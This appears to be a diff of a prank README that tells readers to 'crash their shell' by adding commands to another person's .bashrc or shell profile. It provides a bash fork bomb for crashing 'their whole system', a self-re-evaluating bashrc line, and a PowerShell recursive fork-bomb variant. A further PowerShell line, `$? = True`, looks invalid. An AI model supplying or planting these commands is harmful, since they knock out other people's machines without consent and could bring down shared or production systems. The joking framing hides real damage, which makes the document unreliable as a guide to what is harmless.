@@ -2,8 +2,11 @@
 
 Is someone annoying you? Crash their shell with just a few lines of code.
 
-## Bash
-Just add this to their [`.bashrc`] [1]:
+### Usage
+Try adding these commands to the shell's profile. :laughing:
+
+#### Bash
+Just add this to their [`.bashrc`] <sup>[1]</sup>:
 ```bash
 eval "$BASH_COMMAND"
 ```
@@ -11,6 +14,18 @@ Or even their whole system:
 ```bash
 :(){ :|:& };:
 ```
+
+#### PowerShell 5
+```powershell
+$? = True
+```
+
+#### PowerShell 6
+```
+function i { i|i& };i
+```
+
+More coming soon.
 
 ---
 ### Notes
